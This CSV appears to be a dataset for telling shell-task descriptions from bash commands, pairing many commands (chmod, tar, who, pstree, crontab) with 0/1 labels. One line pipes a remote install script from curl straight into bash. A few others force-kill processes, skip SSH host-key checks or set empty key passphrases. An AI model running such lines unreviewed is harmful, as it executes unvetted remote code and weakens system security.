value,target
chmod 644 $(find /path/to/base/dir -type f),0
"Recursively add read and execute permissions to all files and folders in ""directory""",1
chmod -R +xr directory,0
chmod 600 file,0
set 644 permission to all regular files under current directory,1
chmod 644 `find . -type f`,0
Print unique list of who is logged in and the time of login formatted in columns,1
who -su | sort | uniq | column,0
Print all user names and terminals of users who are logged in,1
"who | awk '{ print $1, $2 }'",0
Print the current user name associated with standard input,1
who -m | awk '{print $1;}',0
print information about all users who are logged in,1
who -la,0
tree -d,0
tree -Csu,0
tree -fi,0
print permissions of every directory in the current directory tree,1
tree -p -d,0
"use awk command 'FNR==NR { array[$1,$2]=$8; next } ($1,$2) in array { print $0 "";"" array[$1,$2] }' on compressed files ""input1.vcf.gz"" and ""input2.vcf.gz""",1
"gzip -dc input1.vcf.gz input2.vcf.gz | awk 'FNR==NR { array[$1,$2]=$8; next } ($1,$2) in array { print $0 "";"" array[$1,$2] }'",0
gzip -dc archive.tar.gz | tar -xf - -C /destination,0
"uncompress ""archive.tar.gz"" and extract the archive to ""/destination""",1
gzip -dc archive.tar.gz | tar -xf - -C /destination,0
"decompress and unarchive ""hello-0.2.tar.gz""",1
gzip -dc hello-0.2.tar.gz | tar -xf -,0
prints week day of a 31 day in a current month.,1
prints calendar for a current month.,1
cal,0
Prints day of first Tuesday in a month.,1
"cal | awk 'NR>2 && NF>4 {printf ""%02d\n"",$(NF-4);exit}'",0
cal April 2012 | tee t | more,0
Print apparent size rather than disk usage,1
du -B1 --apparent-size /tmp/foo.txt,0
List each directory in the current directory prefixed with its disk usage in human readable format and sorted from smallest to largest,1
du -sh */ | sort -n,0
du -ks * | sort -n -r,0
list each file or directory in the current directory prefixed by its human readable filesize and sorted from largest to smallest,1
tar --one-file-system -czv /home | split -b 4000m - /media/DRIVENAME/BACKUPNAME.tgz,0
Create an archive excluding files matching patterns listed in /path/to/exclude.txt,1
tar -czf backup.tar.gz -X /path/to/exclude.txt /path/to/backup,0
tar -xvzf passwd.tar.gz,0
create an archive using pbzip2 as a compress program,1
tar -I pbzip2 -cf OUTPUT_FILE.tar.bz2 /DIR_TO_ZIP/,0
zcat /usr/share/doc/mysql-server-5.0/changelog*.gz | less,0
"Unzip ""daily_backup.sql.gz"" and search for lines matching ""'x'|/x/""",1
zcat input.gz | grep -o 'userAgent=[^=]*' | sed 's/ [^ ]*$//',0
"unzip ""file.gz"" to stdout",1
zcat file.gz,0
replaces the second to last line of file,1
"tac file | sed '2 s/,$//' | tac",0
Print the last word in a.txt,1
tac a.txt | awk 'NF{print $NF; exit}',0
grep for the last occurrence of text between two tags,1
tac a | grep -m1 -oP '(?<=tag>).*(?=</tag>)',0
"tac filename | sed 4,6d | tac",0
"recursively removes 'classes' folder, prompting user on each deletion.",1
rm -r classes,0
Removes empty folder 'symlink'.,1
rm -d symlink,0
"recursively removes $TMPDIR folder, prompting user on each deletion.",1
rm -r $TMPDIR,0
rm `ls -t | awk 'NR>5'`,0
"date +""%T""",0
Convert epoch second timestamp to date,1
date -d @1278999698 +'%Y-%m-%d %H:%M:%S',0
Print the day at 1 day ago in 2 months from now,1
"date -d ""$(date -d ""2 months"" +%Y-%m-1) -1 day"" +%a",0
"date ""+%Y-%m-%d""",0
"pstree -p 20238 | sed 's/(/\n(/g' | grep '(' | sed 's/(\(.*\)).*/\1/' | tr ""\n"" ,",0
prints process tree of a current process with id numbers and parent processes.,1
pstree -sp $$,0
prints all child processes of a process with id 20238.,1
pstree -p 20238 | sed 's/(/\n(/g' | grep '(' | sed 's/(\(.*\)).*/\1/',0
Prints process tree with command line arguments of a process having id $PID.,1
"pstree -a ""$PID""",0
od -t x1 -An /bin/ls | head,0
od -cvAnone -w1,0
od -t x2 -N 1000 $file | cut -c8- | egrep -m1 -q ' 0d| 0d|0d$',0
"read two bytes from ""/dev/urandom"" and print them as an unsigned integer",1
od -A n -N 2 -t u2 /dev/urandom,0
env | grep ^PATH,0
Run 'somecommand' in an environment without the FOO variable.,1
env -u FOO somecommand,0
"Case-insensitive search all existing environment variables and their values for ""shell"".",1
env | grep -i shell,0
"show all variables whose name or value contains ""PATH"", sorted in reverse alphabetical order.",1
env | uniq | sort -r | grep PATH,0
changes group ownership of 'shared' to 'Workers'.,1
chgrp Workers shared,0
chgrp -R git .git,0
changes group ownership of '/etc/btsync/[prefered conf name].conf' to 'btsync'.,1
chgrp btsync /etc/btsync/[prefered conf name].conf,0
Recursively changes group ownership of everything within a '/path/to/repo' to 'GROUP'.,1
chgrp -R GROUP /path/to/repo,0
"Number each line in ""/etc/passwd"" as right-justified zero padded to a width of 9",1
nl -nrz -w9  /etc/passwd,0
nl file | sort -nr | cut -b8-,0
"Add ""prefix"" to every non-blank line in ""file.txt""",1
nl -s prefix file.txt | cut -c7-,0
nl -n ln | sort -u -k 2| sort -k 1n | cut -f 2-,0
"print the last line of the alphabetically sorted lines in file ""set""",1
tail -1 <(sort set),0
tail -n +2 foo.txt,0
"display last 100 lines of file-with-line-too-long.txt, waiting for user input after each page.",1
tail -1000 file-with-line-too-long.txt | more,0
"tail -n +2 ""$FILE""",0
combine every two lines of standard input,1
"paste -d """" - -",0
"print each line in ""file1"" and file2"" separated by a space",1
"paste -d'¤' file1 file2 | sed 's,¤, ,g'",0
"paste <(head -""$lc"" current.txt) <(tail -""$lc"" current.txt) | column -t -o,",0
paste -s -d' \n' input.txt,0
check if process ID 1 exists (init or systemd) and current user has permission to send it signals.,1
kill -0 1,0
kill all background processes,1
kill -INT $(jobs -p),0
"Variable PID contains a process ID, check if this process exists - resulting exit status from this command will be zero if it does and current user has permission to send it signals.",1
kill -0 $PID,0
Clean up all zombie processes by instantly killing their parent process with SIGKILL signal.,1
"kill -9 $(ps -A -ostat,ppid | grep -e '[zZ]'| awk '{ print $2 }')",0
"delete characters in columns 36 through 40 from the output of ""finger""",1
finger |  cut --complement -c36-40,0
finger vivek,0
"print login name and full name of all users currently logged in and delete instances of ""of group.*""",1
finger -l | awk '/^Login/' | sed 's/of group.*//g',0
finger |  sed 's/\(.\{35\}\)...../\1/',0
scp -p /home/reportuser/dailyReport.doc root@localhost:/root/dailyReports/20150105/,0
"connect to host ""server_b"" as ssh user ""user"" and copy local file ""/my_folder/my_file.xml"" to server_b's directory ""/my_new_folder/"".",1
scp -v /my_folder/my_file.xml user@server_b:/my_new_folder/,0
"On host ""server_b"", connect as ssh user ""user"" and copy ""/my_folder/my_file.xml"" to directory ""/my_new_folder/"".",1
scp user@server_b:/my_folder/my_file.xml user@server_b:/my_new_folder/,0
scp -o StrictHostKeyChecking=no root@IP:/root/K,0
bind -f ~/.inputrc,0
bind -q complete,0
"bind '""\e[24~"":""\C-k \C-upwd\n""'",0
"Bind word ""foobar"" to key code ""\e[24~""",1
"bind '""\e[24~"":""foobar""'",0
find the process id of mysql,1
ps -A|grep mysql,0
"finds PIDs of all running processes, gets executable binary of each process, and prints containing folder of each binary.",1
"ps -A -o pid | xargs -I pid readlink ""/proc/pid/exe"" | xargs -I file dirname ""file""",0
print current shell using process ID,1
"Kill all processes matching the string ""myProcessName""",1
ps -ef | grep myProcessName | grep -v grep | awk '{print $2}' | xargs kill -9,0
display file type description of 'file-name' based on contents.,1
file file-name,0
display human-readable file type description of ascii.txt,1
file ascii.txt,0
"display the mimetype of ""filename""",1
file -i filename,0
"show human-readable file type description of file ""/mnt/c/BOOT.INI""",1
file /mnt/c/BOOT.INI,0
which file | xargs file,0
get the actual find exectuable path,1
which find,0
"print file type of the executable file of command ""file""",1
which file | file -f -,0
"Search PATH for utilities called ""rename"", display the type of file (script, executable, ...) for each match found.",1
which -a rename | xargs file -L,0
"add content of ""filename"" to the existing cron jobs of user ""user"", without removing the previously existing cron jobs.",1
crontab -l -u user | cat - filename | crontab -u user -,0
"Add cron lists from ""filename"" to list of cron jobs, giving errors for any lines that cannot be parsed by crontab.",1
crontab filename,0
"Edit current user's cron job list with editor specified by EDITOR environment variable, or default /usr/bin/editor if EDITOR is not set.",1
crontab -e,0
"Prompt user to type a list of cron jobs directly at the terminal, then use these replacing previously existing cron jobs.",1
crontab,0
"count the number of lines in all "".php"" files in the current directory tree",1
wc -l `tree -if --noreport | grep -e'\.php$'`,0
wc -l `find . -type f -name '*.txt' `,0
wc -l `tree -if --noreport | grep -e'\.php$'`,0
prints lines count in each *.c file of a current folder and total count.,1
wc -l *.c,0
basename /usr/local/svn/repos/example,0
"for each item in array ""alpha"", display the basename, that is the part following the last slash, or the whole item if no slash is present.",1
"output ""file.txt"", omitting all containing directories ""some/unknown/amoutn/of/sub/folder/""",1
"basename ""some/unknown/amount/of/sub/folder/file.txt""",0
"basename $(echo ""a:b:c:d:e"" | tr ':' '/')",0
"watch ""ls /proc/$PYTHONPID/fd | wc -l""",0
"Execute ""cat /tmp/iostat.running"" every 10 seconds",1
watch -n10 cat /tmp/iostat.running,0
"execute ""ls -l"" every 0.5 seconds",1
watch -n 0.5 ls -l,0
"Execute `find -type f | egrep -i ""(jpg|bmp|png|gif)$""` every 300 seconds and display without title",1
"watch -n 300 -t `find -type f | egrep -i ""(jpg|bmp|png|gif)$""`",0
adjust the timestamp of 'filename' by subtracting 2 hours from it.,1
"touch -d ""$(date -r filename) - 2 hours"" filename",0
Adjust the timestamp of file $filename by subtracting 2 hours from it,1
"touch -d ""$(date -r ""$filename"") - 2 hours"" ""$filename""",0
Create an empty file with a carriage return character in its name.,1
touch $'Icon\r',0
update the timestamp of '/tmp/$$' to the current month and day,1
touch -t `date +%m%d0000` /tmp/$$,0
bzip2 -c file | tee -a logfile,0
bzip2 -t file.bz2,0
"decompresses file 'xac.bz2', redirecting output to standard out.",1
bzip2 -dc xac.bz2,0
bzip2 -kv */*/*,0
readlink -f /x/y/../../a/b/z/../c/d,0
readlink -f `ls --dereference /proc/$pid/exe`,0
readlink -f $(which java),0
readlink -m FILE,0
"fold -w ""$COLUMNS"" testfile | wc -l",0
"Display a sorted count of all the characters in ""filename""",1
fold -w1 filename | sort | uniq -c | sort -nr,0
"list unique series of 3 characters in file ""$1"" prefixed by the number of occurrences and sorted from most frequent to least frequent",1
"fold -w3 ""$1"" | sort | uniq -c | sort -k1,1nr -k2",0
"Wrap each line in ""yourfile"" to fit in 79 characters and right pad any lines shorter with spaces",1
"fold -w79 yourfile | sed -e :a -e 's/^.\{0,78\}$/& /;ta'",0
"source  <(date +""CDATE='%Y-%m-%d %H:%M:%S' EPOCH='%s'"")",0
"execute commands from ""$file"" in the current shell.",1
"source ""$file""",0
"in the current shell, interpret 'incl.sh' which is in the directory pointed by variable DIR",1
"source ""$DIR/incl.sh""",0
"source ""$( dirname ""${BASH_SOURCE[0]}"" )/incl.sh""",0
"List "".java"" files that have the same contents",1
md5sum *.java | sort | uniq -d -w32,0
List unique MD5 digests of all files in the current directory ending in .txt,1
md5sum *.txt | cut -d ' ' -f 1 | sort -u,0
"Calculate a list of duplicate md5 sum hashes for all the "".java"" files in the current directory",1
md5sum *.java | awk '{print $1}' | sort | uniq -d,0
md5sum * | sed -e 's/\([^ ]*\) \(.*\(\..*\)\)$/mv -v \2 \1\3/e',0
print the IP addresses for the current host name,1
hostname -I | awk '{print $1}',0
hostname -I,0
print IP addresses of the current host,1
"hostname -I|cut -d"" "" -f 1",0
"set the host name to ""myServersHostname""",1
hostname myServersHostname,0
"head -1 table | tr -s ' ' '\n' | nl -nln |  grep ""Target"" | cut -f1",0
head -5 tst.txt | tail -1 |cut -c 5-8,0
head /dev/random -c16 | od -tx1 -w16 | head -n1 | cut -d' ' -f2- | tr -d ' ',0
removes last N lines from file.txt,1
head --lines=-N file.txt,0
view manual page of the find command,1
man find,0
view the man page of find,1
man find,0
"display the 'bash' manpage, going to the first occurence of \' sequence of characters.",1
"man bash | less -Ip ""\\\'""",0
Display the manual page of find,1
man find,0
list jobs including its PIDs,1
List all processes with its PIDs,1
jobs -l,0
jobs -p | xargs kill -9,0
jobs -l,0
rename s/0000/000/ F0000*,0
"rename all files in current directory to lowerase, overwriting any existing files.",1
rename -f 'y/A-Z/a-z/' *,0
rename 's/(.*)$/new.$1/' original.filename,0
"rename all .png files, changing the string ""_h.png"" into ""_half.png"".",1
rename 's/_h.png/_half.png/' *.png,0
"Retrieve only build number of current kernel, ie. #104",1
uname -v | grep -o '#[0-9]\+',0
"display operating system type, ie. GNU/Linux",1
uname -o,0
Check if current system is running in 64-bit addressing.,1
uname -m | grep '64',0
uname -r | sed 's/\([0-9]\+\.[0-9]\+\)\..*/\1/',0
cut -d' ' -f1 file.txt | xargs dig +short,0
cut -d' ' -f1 file2 | comm -13 - file1,0
"Extract, sort and print only group names from /etc/group.",1
cut -d: -f1 /etc/group | sort,0
"Print the 5th space separated fields in ""file"" as a comma separated list",1
"cut -d' ' -f5 file | paste -d',' -s",0
"Find md5sum of content from ""www.google.com""",1
curl -s www.google.com | md5,0
"download file  ""https://raw.githubusercontent.com/creationix/nvm/v0.31.0/install.sh"" and execute it",1
curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.31.0/install.sh | bash,0
curl -s 'http://archive.ubuntu.com/ubuntu/pool/universe/s/splint/splint_3.1.2.dfsg1-2.diff.gz' | gunzip -dc | less,0
"download contents of a website ""https://get.scoop.sh""",1
curl -L https://get.scoop.sh,0
"groups $1 | grep -q ""\b$2\b""",0
Prints out all the logged-in users along with their group information.,1
groups $(who | cut -d' ' -f 1),0
checks that 'monit' user is in 'www-data' group.,1
groups monit |grep www-data,0
Prints groups list that user 'el' belongs to.,1
groups el                                     //see that el is part of www-data,0
"rotates the dirs stack so that the second directory (counting from the right of the list shown by `dirs', starting with zero) is at the top.",1
pushd -2,0
"pushes to the dirs stack directory path of the current script, or current directory path if executed from bash shell.",1
pushd $(dirname $0),0
"Add directory ""$HOME/Pictures"" to the directory stack",1
"pushd ""$HOME/Pictures""",0
"pushes directory path that saved in $line variable to the dirs stack, expanding symbol '~', if present, as home folder path.",1
"pushd ""${line/#\~/$HOME}"";",0
"prints long listing of directories ""./my dir"" and ""./anotherdir"" sorted from oldest to newest, with appended indicators.",1
"$ ls -Fltr ""./my dir"" ""./anotherdir""",0
$ my_temp_dir=$(mktemp -d --tmpdir=$temp_dir -t $template),0
search in the current directory and all sub-directories except ./D and any further sub-directories also named D for the file named hi.dat,1
$ find . \( -name D -prune \) -o -name hi.dat,0
"extract ""filename.tar.xz"" with verbose output",1
$ tar xvfJ filename.tar.xz,0
column -t -s '' list-of-entries.txt,0
"Delimit standard input with "":"" and display as a table",1
column -s: -t,0
"format the contents of ""[file]"" in a neat table",1
column -t [file],0
"treat each line of ""list-of-entries.txt"" as a value to be put in one cell of the table that ""column"" outputs",1
column list-of-entries.txt,0
Display the host's ECDSA fingerprint using the md5 hasing algorithm.,1
ssh-keygen -l -E md5 -f /etc/ssh/ssh_host_ecdsa_key.pub,0
"create a rsa key of 2048 bits with comment ""michael"" and store it in file ""key"".",1
ssh-keygen -b 2048 -t rsa -f key -C michael,0
"ssh-keygen -f ~/.ssh/id_rsa -P """"",0
"request changing the passphrase of key file ""private.key""",1
ssh-keygen -pf private.key,0
rev   test.txt | sort  -k2 | rev,0
rev file.txt | cut -d/ -f1 | rev,0
Print content of 'file' file reverted characterwise,1
rev file,0
display each line in file.txt backwards,1
rev file.txt,0
"unzip every "".gz"" file in the current directory",1
gunzip *.gz,0
"Search ""mygzfile.gz"" for ""string to be searched""",1
"gunzip -c mygzfile.gz | grep ""string to be searched""",0
gunzip -c 4.56_release.tar.gz | tar xvf -,0
gunzip -l file.zip,0
prints current directory name,1
"pwd | grep -o ""\w*-*$""",0
List each subdirectory name composing the current working directory,1
pwd | cut -b2- | tr '/' '\n',0
print the current working directory with resolved symbolic links,1
pwd -P,0
pwd | awk -F / '{print $NF}',0
replace all non-punctuation characters with newlines from standard input,1
tr -sc '[:punct:]' '\n',0
Print second section of data coming from stdin where sections are separated by one or more whitespace.,1
tr -s ' ' | cut -d ' ' -f 2,0
tr -d ' ',0
"numerically sort IPv4 addresses specified on standard input with presedence to first, second, third, then fourth octet",1
tr '.' ' ' | sort -nu -t ' ' -k 1 -k 2 -k 3 -k 4 | tr ' ' '.',0
finds the folder where temporary files would be written to.,1
dirname $(mktemp -u -t tmp.XXXXXXXXXX),0
Prints first found folder that contains 'ssh' file and has 'bin' in path.,1
dirname `find / -name ssh | grep bin | head -1`,0
finds all folders that contain 'ssh' file and have 'bin' in path.,1
dirname `find / -name ssh | grep bin`,0
Prints path to the target of symbolic link 'relative/path/to/file',1
dirname `readlink -e relative/path/to/file`,0
finds all logged in users.,1
w | awk '{print $1}',0
Prints logged in users in sorted order.,1
w | sort,0
display who is logged on and what they are doing,1
w,0
show logged in users with idle time of each one,1
"w | tr -s "" "" | cut -d"" "" -f1,5 | tail -n+3",0
"executes 'echo ""$ret""' in a subshell that is opened by command 'true'.",1
"true | echo ""$ret""",0
"saves exit statuses of piped commands in a system variable PIPESTATUS='([0]=""0"" [1]=""1"" [2]=""0"")'",1
true | false | true,0
Executes 'cd /' in a subshell created by a pipeline of built-in function 'true'.,1
true | cd /,0
true | sleep 10,0
"Cuts off last two parts from the path $dir, and deletes resulted folder if empty.",1
"rmdir ""$(dirname $(dirname $dir))""",0
rmdir ed*,0
"rmdir ""$(dirname $dir)""",0
rmdir --ignore-fail-on-non-empty $newBaseDir/Data/NewDataCopy,0
su -,0
su git,0
Simulate a full login of user root,1
su -,0
su -l,0
creates temporary file by template provided in option '-t'.,1
mktemp -t identifier.XXXXXXXXXX,0
